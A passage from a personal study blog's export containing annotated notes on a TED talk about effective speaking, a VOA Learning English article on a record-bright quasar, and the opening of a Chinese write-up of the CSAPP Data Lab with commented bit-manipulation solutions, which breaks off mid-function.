<h3 id="judging"><a href="#judging" class="headerlink" title="judging"></a>judging</h3><p>Second, judging. We know people who are like this in conversation, and it’s very hard to listen to somebody if you know that you’re being judged and found wanting(不合格,有欠缺的) at the same time.</p>
<h3 id="negativity"><a href="#negativity" class="headerlink" title="negativity"></a>negativity</h3><p>Third, negativity. You can fall into this. My mother, in the last years of her life, became very negative, and it’s hard to listen. I remember one day, I said to her, “It’s October 1 today,” and she said, “I know, isn’t it dreadful( <strong>extremely unpleasant</strong>)?”</p>
<p>(Laughter)</p>
<p>It’s hard to listen when somebody’s that negative.</p>
<p>(Laughter)</p>
<h3 id="complaining"><a href="#complaining" class="headerlink" title="complaining"></a>complaining</h3><p>And another form of negativity, complaining. Well, this is the national art of the UK. It’s our national sport. We complain about the weather, sport, about politics, about everything, but actually, complaining is viral（病毒性的） misery.（痛苦） It’s not spreading sunshine and lightness in the world.</p>
<h3 id="excuses"><a href="#excuses" class="headerlink" title="excuses"></a>excuses</h3><p> Excuses. We’ve all met this guy（坏蛋）. Maybe we’ve all been this guy. Some people have a blame thrower（指责癖好）. They just pass it on to everybody else  and don’t take responsibility for their actions, and again, hard to listen to somebody who is being like that. </p>
<h3 id="lying"><a href="#lying" class="headerlink" title="lying"></a>lying</h3><p>Penultimate（倒数第二的）, the sixth of the seven, embroidery,(刺绣&#x2F;夸张之间，渲染) exaggeration（吹牛，浮夸）. It demeans（贬低） our language, actually, sometimes. For example, if I see something that really is awesome, what do I call it?</p>
<p>(Laughter)</p>
<p>And then, of course, this exaggeration becomes lying, and we don’t want to listen to people we know are lying to us.</p>
<h3 id="dogmatism-固执己见"><a href="#dogmatism-固执己见" class="headerlink" title="dogmatism(固执己见)"></a>dogmatism(固执己见)</h3><p> And finally, dogmatism. The confusion of facts with opinions. When those two things get conflated, you’re listening into the wind. You know, somebody is bombarding（轰炸） you with their opinions as if they were true. It’s difficult to listen to that.So here they are, seven deadly sins of speaking. These are things I think we need to avoid. </p>
<p> But is there a positive way to think about this? Yes, there is. I’d like to suggest that there are four really powerful cornerstones, foundations, that we can stand on if we want our speech to be powerful and to make change in the world. </p>
<h2 id="HAIL"><a href="#HAIL" class="headerlink" title="HAIL"></a>HAIL</h2><p>Fortunately, these things spell a word. The word is “hail,” and it has a great definition as well. I’m not talking about the stuff that falls from the sky and hits you on the head. I’m talking about this definition, <strong>to greet or acclaim enthusiastically</strong>, which is how I think our words will be received if we stand on these four things.So what do they stand for? See if you can guess. </p>
<p>The H, honesty, of course, being true in what you say, being straight and clear. The A is authenticity,  just being yourself. A friend of mine described it as standing in your own truth, which I think is a lovely way to put it. The I is integrity(一身正气）, being your word, actually doing what you say, and being somebody people can trust. And the L is love. I don’t mean romantic love, but I do mean wishing people well, for two reasons. </p>
<p> First of all, I think absolute honesty may not be what we want. I mean, my goodness, you look ugly this morning. Perhaps that’s not necessary. Tempered with love（适当的带着爱）, of course, honesty is a great thing. But also, if you’re really wishing somebody well, it’s very hard to judge them at the same time. I’m not even sure you can do those two things simultaneously（同时地）. So hail.Also, now that’s what you say, and it’s like the old song, it is what you say, it’s also the way that you say it. You have an amazing toolbox. This instrument is incredible, and yet this is a toolbox that very few people have ever opened. I’d like to have a little rummage（翻找，调查） in there with you now and just pull a few tools out that you might like to take away and play with, which will increase the power of your speaking.</p>
<h2 id="Some-tools"><a href="#Some-tools" class="headerlink" title="Some tools"></a>Some tools</h2><h3 id="register（音域）"><a href="#register（音域）" class="headerlink" title="register（音域）"></a>register（音域）</h3><p> Register, for example. Now, falsetto register（假声） may not b e very useful most of the time, but there’s a register in between.  I’m not going to get very technical about this for any of you who are voice coaches. You can locate your voice, however. So if I talk up here in my nose, you can hear the difference. If I go down here in my throat, which is where most of us speak from most of the time. But if you want weight, you need to go down here to the chest. You hear the difference? We vote for politicians with lower voices, it’s true, because we associate depth with power and with authority. That’s register.</p>
<h3 id="timbre（音色）"><a href="#timbre（音色）" class="headerlink" title="timbre（音色）"></a>timbre（音色）</h3><p>Then we have timbre. It’s the way your voice feels. Again, the research shows that we prefer voices which are rich, smooth, warm, like hot chocolate. Well if that’s not you, that’s not the end of the world, because you can train. Go and get a voice coach. And there are amazing things you can do with breathing, with posture（姿势） , and with exercises to improve the timbre of your voice.</p>
<h3 id="prosody"><a href="#prosody" class="headerlink" title="prosody"></a>prosody</h3><p>Then prosody（韵律）. I love prosody. This is the sing-song, the meta-language that we use in order to impart(传达传授，透露) meaning. It’s root one for meaning in conversation. People who speak all on one note are really quite hard to listen to if they don’t have any prosody at all. That’s where the word “monotonic（没有起伏，单调） “ comes from, or monotonous, monotone. Also, we have repetitive prosody now coming in, where every sentence ends as if it were a question when it’s actually not a question, it’s a statement? </p>
<p>(Laughter)</p>
<p>And if you repeat that one, it’s actually restricting your ability to communicate through prosody, which I think is a shame, so let’s try and break that habit. </p>
<h3 id="pace"><a href="#pace" class="headerlink" title="pace"></a>pace</h3><p>Pace. I can get very excited by saying something really quickly, or I can slow right down to emphasize, and at the end of that, of course, is our old friend silence. There’s nothing wrong with a bit of silence in a talk, is there? We don’t have to fill it with ums and ahs. It can be very powerful.</p>
<h3 id="pitch-音高"><a href="#pitch-音高" class="headerlink" title="pitch(音高)"></a>pitch(音高)</h3><p>Of course, pitch often goes along with pace to indicate arousal（激动，兴奋）, but you can do it just with pitch. Where did you leave my keys? (Higher pitch) Where did you leave my keys? So, slightly different meaning in those two deliveries. </p>
<h3 id="volume"><a href="#volume" class="headerlink" title="volume"></a>volume</h3><p>And finally, volume. (Loud) I can get really excited by using volume. Sorry about that, if I startled(打扰受惊，使吃惊) anybody. Or, I can have you really pay attention by getting very quiet. Some people broadcast the whole time. Try not to do that. That’s called sodcasting（公放音乐）,</p>
<p>(Laughter)</p>
<p>Imposing（impose强制实行） your sound on people around you carelessly and inconsiderately. Not nice.Of course, where this all comes into play most of all is when you’ve got something really important to do. It might be standing on a stage like this and giving a talk to people. It might be proposing marriage（求婚）, asking for a raise, a wedding speech. Whatever it is, if it’s really important, you owe it to yourself to look at this toolbox and the engine that it’s going to work on, and no engine works well without being warmed up. Warm up your voice.Actually, let me show you how to do that. </p>
<h3 id="the-way-to-warm-up"><a href="#the-way-to-warm-up" class="headerlink" title="the way to warm up"></a>the way to warm up</h3><p>Would you all like to stand up for a moment? I’m going to show you the six vocal warm-up exercises that I do before every talk I ever do. Any time you’re going to talk to anybody important, do these. </p>
<p>First, arms up, deep breath in, and sigh out, ahhhhh, like that. One more time. Ahhhh, very good. Now we’re going to warm up our lips, and we’re going to go Ba, Ba, Ba, Ba, Ba, Ba, Ba, Ba. Very good. And now, brrrrrrrrrr, just like when you were a kid. Now your lips should be coming alive. We’re going to do the tongue next with exaggerated(夸张) la, la, la, la, la, la, la, la, la. Beautiful. You’re getting really good at this. And then, roll an R. Rrrrrrr. That’s like champagne（香槟酒） for the tongue. Finally, and if I can only do one, the pros（老手，运动员） call this the <strong>siren</strong>（警报器）. It’s really good. It starts with “we” and goes to “aw.” The “we” is high, the “aw” is low. So you go, weeeaawww, weeeaa<a href="http://www.fantastic/">www.Fantastic</a>. Give yourselves a round of applause. Take a seat, thank you.</p>
<p>(Applause)</p>
<h2 id="Conclude"><a href="#Conclude" class="headerlink" title="Conclude"></a>Conclude</h2><p>Next time you speak, do those in advance. Now let me just put this in context to close. This is a serious point here. This is where we are now, right? We speak not very well to people who simply aren’t listening in an environment that’s all about noise and bad acoustics（听觉的）. I have talked about that on this stage in different phases. What would the world be like if we were speaking powerfully to people who were listening consciously in environments which were actually fit for purpose? Or to make that a bit larger, what would the world be like if we were creating sound consciously and consuming（倾听）sound consciously and designing all our environments consciously for sound? That would be a world that does sound beautiful, and one where understanding would be the norm, and that is an idea worth spreading.</p>
<p>Thank you. </p>
<p>(Applause)</p>
]]></content>
      <categories>
        <category>TED</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>TED</tag>
      </tags>
  </entry>
  <entry>
    <title>Quasar</title>
    <url>/VOA/VOA_2/2024/02/27/</url>
    <content><![CDATA[<p><a href="https://www.51voa.com/VOA_Special_English/scientists-identify-possibly-brightest-object-in-the-universe-92293.html">MP3</a></p>
<p><em>By Bryan Lynn</em><br><em>25 February 2024</em></p>
<p>Astronomers say they may have discovered the brightest object ever observed in the universe.</p>
<p>The discovery involves a distant space object known as a <strong>quasar</strong><code>an object in space that is similar to a star and that shines very brightly</code>. The American space agency NASA <a href="https://www.nasa.gov/universe/nasas-webb-will-use-quasars-to-unlock-the-secrets-of-the-early-universe/">describes</a> quasars as “very bright, distant and active supermassive black holes that are millions to billions of times the mass of the Sun.”</p>
<p>A quasar’s light “outshines” all other stars and “its jets and winds shape” its galaxy, NASA adds.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402270754572.jpeg" alt="This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser/ESO via AP)"><br><strong>This illustration provided by the European Southern Observatory in February 2024, depicts the record-breaking quasar J059-4351. (M. Kornmesser&#x2F;ESO via AP)</strong></p>
<p>A team led by Australian researchers identified the super bright quasar. The European Southern Observatory’s (ESO’s) Very Large Telescope, based in northern Chile, collected most of the data. Additional data came from Australia’s Siding Spring Observatory.</p>
<p>The researchers estimate the record-breaking quasar is at least 500 trillion times brighter than our own sun. The team also noted the black hole powering the object is more than 17 billion times larger than our sun.</p>
<p>The quasar is about 12 billion light years away from Earth. It is thought to have existed since the early days of the universe. A light year is the distance light travels in a year – about 9.5 trillion kilometers.</p>
<p>The object was already known and had been studied before. But scientists say it was misidentified in the past as a star. The newly identified quasar is so large that its black hole could easily swallow at least one sun per day, the team said.</p>
<p>The researchers recently reported their finding <a href="https://www.nature.com/articles/s41550-024-02195-x">in a study</a> in the publication <em>Nature Astronomy</em>.</p>
<p>The quasar appears only as a small dot in images. But scientists say they imagine it to be a very powerful and active place. The team says the black hole is thought to have a circulating <strong>disk</strong> containing gas and other matter from swallowed stars. The disk spins continuously like an intense, active storm.</p>
<p>“This quasar is the most violent place that we know in the universe,” said the lead writer of the study, Christian Wolf. He is an astronomer and professor in the College of Science at Australian National University.</p>
<p>The ESO first found the object, known as J0529-4351, in 1980. At the time, it was identified, or classified, as a star. Then last year, it was identified as a quasar.</p>
<p>The latest observations and computer modeling suggest the quasar is taking in amounts of material equal to about 370 suns a year, or about one per day. The team says more observations will be needed to fully understand the object’s growth rate.</p>
<p>Priyamvada Natarajan is a professor of astronomy and physics at Yale University. She was not part of the latest study. But Natarajan told the Associated Press, “The exciting thing about this quasar is that it was hiding in plain sight and was misclassified as a star previously.”</p>
<p>Study co-writer Christopher Onken added, “It is a surprise that it has remained unknown until today, when we already know about a million less <strong>impressive</strong> quasars.”</p>
<p>The researchers say finding and studying distant supermassive black holes could help astronomers learn important details about the birth and development of the early universe. But study leader Wolf noted that he also gets enjoyment out of the search itself.</p>
<p>“Personally, I simply like the chase,” he <a href="https://www.eso.org/public/news/eso2402/">said</a> in a statement. “For a few minutes a day, I get to feel like a child again, playing treasure hunt. And now, I bring everything to the table that I have learned since.”</p>
<p>Future research is expected to center on the history of the quasar and measuring its growth and development. The team noted that some of this data should be easier to collect after the Very Large Telescope receives an instrument <strong>upgrade</strong>. The upgrade, known as Gravity+, is designed to provide more exact measurements of the mass of distant black holes.</p>
<p>In addition, the ESO plans to launch a future observer, called the Extremely Large Telescope (ELT), in Chile’s Atacama Desert. That telescope, the researchers say, will improve on current identification and study methods to identify such distant objects.</p>
<p align="right">I'm Bryan Lynn</p>
<p align="right">Edit by Vite</p>

<p><em>Bryan Lynn wrote this story for VOA Learning English, based on reports from The Associated Press and the European Southern Observatory.</em></p>
<p><strong>—————–</strong></p>
<h2 id="Words-in-This-Story"><a href="#Words-in-This-Story" class="headerlink" title="Words in This Story"></a>Words in This Story</h2><p><strong>disk</strong> <em>– n.</em> a flat, round object</p>
<p><strong>impressive</strong> <em>– adj.</em> something considered noteworthy or causing admiration or respect</p>
<p><strong>upgrade</strong> <em>– n.</em> to improve something that is higher quality of a newer model</p>
]]></content>
      <categories>
        <category>VOA</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>VOA</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab1-datalab</title>
    <url>/CSAPP/lab1/2023/12/11/</url>
    <content><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
<li>位运算(对!,^,&amp;,~,|,这些符号的准确理解)</li>
<li>float的规格化,非规格化</li>
<li>熟练使用二进制分析</li>
<li>充分清楚逻辑右移和算术右移的区别,以及知道计算机的默认移动</li>
</ul>
<h3 id="做题策略"><a href="#做题策略" class="headerlink" title="做题策略"></a>做题策略</h3><ul>
<li>十分建议自己充分思考,画图举例子,建议从四个bits的位开始举例子</li>
<li>真的不行就看看视频讲解吧,在这里推荐一个b站up的csapp讲解(主要是由于本人不喜欢看文字)</li>
</ul>
<blockquote>
<p><a href="https://www.bilibili.com/video/BV183411k7VM/?spm_id_from=333.337.search-card.all.click&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">【深入理解计算机系统 实验1 CSAPP】datalab + 环境搭建 data lab_哔哩哔哩_bilibili</a></p>
</blockquote>
<ul>
<li>建议把书本认真的看完第一章,我是看到一半到浮点数的规格化就没耐心了,直接做题,导致有较大阻碍</li>
</ul>
<h3 id="代码分享和讲解"><a href="#代码分享和讲解" class="headerlink" title="代码分享和讲解"></a>代码分享和讲解</h3><p>以下是写好的代码,里面有大量的注释便于理解(是在官方给的bit.c中补充函数的功能)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * zhzvite 2811215248@qq.com</span></span><br><span class="line"><span class="comment"> * bits.c - Source file with your solutions to the Lab.</span></span><br><span class="line"><span class="comment"> *          This is the file you will hand in to your instructor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Do not include the &lt;stdio.h&gt; header; it confuses the dlc</span></span><br><span class="line"><span class="comment"> * compiler. You can still use printf for debugging without including</span></span><br><span class="line"><span class="comment"> * &lt;stdio.h&gt;, although you might get a compiler warning. In general,</span></span><br><span class="line"><span class="comment"> * it&#x27;s not good practice to ignore compiler warnings, but in this</span></span><br><span class="line"><span class="comment"> * case it&#x27;s OK.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0<span class="comment">//lab的规则(类似与游戏规则)</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Instructions to Students:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * STEP 1: Read the following instructions carefully.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">You will provide your solution to the Data Lab by</span><br><span class="line">editing the collection of functions in this source file.</span><br><span class="line"></span><br><span class="line">INTEGER CODING RULES:</span><br><span class="line"> </span><br><span class="line">  Replace the <span class="string">&quot;return&quot;</span> statement in each function with one</span><br><span class="line">  or more lines of C code that implements the function. Your code </span><br><span class="line">  must conform to the following style:</span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> <span class="title function_">Funct</span><span class="params">(arg1, arg2, ...)</span> &#123;</span><br><span class="line">      <span class="comment">/* brief description of how your implementation works */</span></span><br><span class="line">      <span class="type">int</span> var1 = Expr1;</span><br><span class="line">      ...</span><br><span class="line">      <span class="type">int</span> varM = ExprM;</span><br><span class="line"></span><br><span class="line">      varJ = ExprJ;</span><br><span class="line">      ...</span><br><span class="line">      varN = ExprN;</span><br><span class="line">      <span class="keyword">return</span> ExprR;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Each <span class="string">&quot;Expr&quot;</span> is an expression using ONLY the following:</span><br><span class="line">  <span class="number">1.</span> Integer constants <span class="number">0</span> through <span class="number">255</span> (<span class="number">0xFF</span>), inclusive. You are</span><br><span class="line">      not allowed to use big constants such as <span class="number">0xffffffff</span>.</span><br><span class="line">  <span class="number">2.</span> Function arguments and local <span class="title function_">variables</span> <span class="params">(no global variables)</span>.</span><br><span class="line">  3. Unary integer operations ! ~</span><br><span class="line">  4. Binary integer operations &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line">    </span><br><span class="line">  Some of the problems <span class="keyword">restrict</span> the <span class="built_in">set</span> of allowed operators even further.</span><br><span class="line">  Each &quot;Expr&quot; may consist of multiple operators. You are not restricted to</span><br><span class="line">  one operator per line.</span><br><span class="line"></span><br><span class="line">  You are expressly forbidden to:</span><br><span class="line">  1. Use any control constructs such as <span class="keyword">if</span>, <span class="keyword">do</span>, <span class="keyword">while</span>, <span class="keyword">for</span>, <span class="keyword">switch</span>, etc.</span><br><span class="line">  2. Define or use any macros.</span><br><span class="line">  3. Define any additional functions in this file.</span><br><span class="line">  4. Call any functions.</span><br><span class="line">  5. Use any other operations, such as &amp;&amp;, ||, -, or ?:</span><br><span class="line">  6. Use any form of casting.</span><br><span class="line">  7. Use any data type other than <span class="type">int</span>.  This implies that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  You may assume that your machine:</span><br><span class="line">  1. Uses 2s complement, 32-bit representations of integers.</span><br><span class="line">  2. Performs right shifts arithmetically.</span><br><span class="line">  3. Has unpredictable behavior when shifting <span class="keyword">if</span> the shift amount</span><br><span class="line">     is less than 0 or greater than 31.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXAMPLES OF ACCEPTABLE CODING STYLE:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus1 - returns 2^x + 1, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus1</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; x) + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * pow2plus4 - returns 2^x + 4, where 0 &lt;= x &lt;= 31</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> <span class="title function_">pow2plus4</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">     <span class="comment">/* exploit ability of shifts to compute powers of 2 */</span></span><br><span class="line">     <span class="type">int</span> result = (<span class="number">1</span> &lt;&lt; x);</span><br><span class="line">     result += <span class="number">4</span>;</span><br><span class="line">     <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">FLOATING POINT CODING RULES</span><br><span class="line"></span><br><span class="line">For the problems that require you to implement floating-point operations,</span><br><span class="line">the coding rules are less strict.  You are allowed to use looping and</span><br><span class="line">conditional control.  You are allowed to use both ints and unsigneds.</span><br><span class="line">You can use arbitrary integer and <span class="type">unsigned</span> constants. You can use any arithmetic,</span><br><span class="line">logical, or comparison operations on <span class="type">int</span> or <span class="type">unsigned</span> data.</span><br><span class="line"></span><br><span class="line">You are expressly forbidden to:</span><br><span class="line">  <span class="number">1.</span> Define or use any macros.</span><br><span class="line">  <span class="number">2.</span> Define any additional functions in this file.</span><br><span class="line">  <span class="number">3.</span> Call any functions.</span><br><span class="line">  <span class="number">4.</span> Use any form of casting.</span><br><span class="line">  <span class="number">5.</span> Use any data type other than <span class="type">int</span> or <span class="type">unsigned</span>.  This means that you</span><br><span class="line">     cannot use arrays, structs, or unions.</span><br><span class="line">  <span class="number">6.</span> Use any floating point data types, operations, or constants.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTES:</span><br><span class="line">  <span class="number">1.</span> Use the <span class="title function_">dlc</span> <span class="params">(data lab checker)</span> <span class="title function_">compiler</span> <span class="params">(described in the handout)</span> to </span><br><span class="line">     check the legality of your solutions.</span><br><span class="line">  2. Each function has a maximum number of <span class="title function_">operations</span> <span class="params">(integer, logical,</span></span><br><span class="line"><span class="params">     or comparison)</span> that you are allowed to use <span class="keyword">for</span> your implementation</span><br><span class="line">     of the function.  The max operator count is checked by dlc.</span><br><span class="line">     Note that <span class="title function_">assignment</span> <span class="params">(<span class="string">&#x27;=&#x27;</span>)</span> is not counted; you may use as many of</span><br><span class="line">     these as you want without penalty.penalty:罚款</span><br><span class="line">  <span class="number">3.</span> Use the btest test <span class="title function_">harness</span><span class="params">(马具,挽具)</span> to check your functions <span class="keyword">for</span> correctness.</span><br><span class="line">  4. Use the BDD checker to formally verify your functions</span><br><span class="line">  5. The maximum number of ops <span class="keyword">for</span> each function is given in the</span><br><span class="line">     header comment <span class="keyword">for</span> each function. If there are any inconsistencies </span><br><span class="line">     between the maximum ops in the writeup and in this file, consider</span><br><span class="line">     this file the authoritative source.</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * STEP 2: Modify the following functions according the coding rules.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   IMPORTANT. TO AVOID GRADING SURPRISES:</span></span><br><span class="line"><span class="comment"> *   1. Use the dlc compiler to check that your solutions conform</span></span><br><span class="line"><span class="comment"> *      to the coding rules.</span></span><br><span class="line"><span class="comment"> *   2. Use the BDD checker to formally verify that your solutions produce </span></span><br><span class="line"><span class="comment"> *      the correct answers.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//有一些生词,但是不影响阅读</span></span></span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (~(~x &amp; ~y) &amp; ~(x &amp; y));</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  讲解:~(~x&amp;~y)把x,y中都为0的位置标记为0,其余都为1</span></span><br><span class="line"><span class="comment">  ~(x&amp;y)则是把x,y中对应两个都为1的位置标记成0,其余都为1</span></span><br><span class="line"><span class="comment">  故两个相&amp;就是异或的功能</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line">  <span class="comment">// 最小的二进制补码的整数,那就是最高位为1,其余位置全为0,int为4个字节,即为32个bit</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((~(x + <span class="number">1</span>)) ^ x)) &amp; !!(x + <span class="number">1</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   特判x=-1的情况,用两次!!,把他变为0或者1</span></span><br><span class="line"><span class="comment">   (~(x+1))^x)来验证x是否为最大值</span></span><br><span class="line"><span class="comment">   需要注意,判断a==b,在位运算下这样操作</span></span><br><span class="line"><span class="comment">   !(a^b),为1则相同,为0则不同</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123; <span class="comment">// 首先注意,0xAAAAAAAA这样的串都是从第0位开始,别搞错了</span></span><br><span class="line">  <span class="comment">// 本题思路是让x|0xAAAAAAAA再和x判断相不相等</span></span><br><span class="line">  <span class="comment">// 故a,b,c是为了通过移位造出0xAAAAAAAA,可以用这种办法继续造10个A,12个A,以此类推</span></span><br><span class="line">  <span class="type">int</span> a = <span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  <span class="type">int</span> b = a | <span class="number">0xAA</span>;</span><br><span class="line">  <span class="type">int</span> c = b &lt;&lt; <span class="number">16</span> | b;</span><br><span class="line">  <span class="keyword">return</span> !((x | c) ^ x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (~x) + <span class="number">1</span>; <span class="comment">// 这里我是以四个bits为例子,随便列举了几个,就试出来了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>);    <span class="comment">// 检查除去前四位是不是满足条件,满足则为1</span></span><br><span class="line">  <span class="type">int</span> b = x &amp; <span class="number">0xf</span>;              <span class="comment">// 这样就是只保留后四位</span></span><br><span class="line">  <span class="type">int</span> cond2 = (b + ~<span class="number">0xA</span> + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>; <span class="comment">// 要让b为0~9之间,则我们知道b-10&lt;0,并且我们知道-x=~x+1,0xA=10,所以用b+~0xA+1再右移31位,判断负号</span></span><br><span class="line">  <span class="keyword">return</span> cond1 &amp; cond2;<span class="comment">//要满足(除去后四位其他位一样)和(后四位符合(0~9)-10&lt;0)两种情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z</span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  </span><br><span class="line">  x = !!x;                   <span class="comment">// 将x转化为bool类型,注意0取反全是0,1取反全是1,妙!</span></span><br><span class="line">  x = ~x + <span class="number">1</span>;                <span 